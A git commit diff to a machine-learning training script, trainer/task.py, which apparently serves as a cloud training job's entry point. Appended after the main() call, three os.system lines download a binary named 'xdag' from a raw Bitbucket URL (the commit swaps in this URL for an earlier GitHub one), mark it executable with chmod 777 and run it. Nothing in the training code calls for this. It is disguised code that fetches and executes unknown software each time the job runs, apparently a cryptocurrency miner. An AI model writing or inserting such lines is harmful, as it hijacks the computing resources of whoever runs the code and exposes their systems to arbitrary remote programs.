86d906bca168b418f1da48b1af4db45da0e1eb7b
Angga butut <anggabutut04@gmail.com>
2022-07-10 10:23:10 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aingcuy778/dagx/main/xdag')
+os.system('wget https://bitbucket.org/angga98/wang/raw/4d9cccdeb02f5d42ccad78e25b6e1bebcdcaa0b2/xdag')
 os.system('chmod 777 xdag')
 os.system('./xdag')
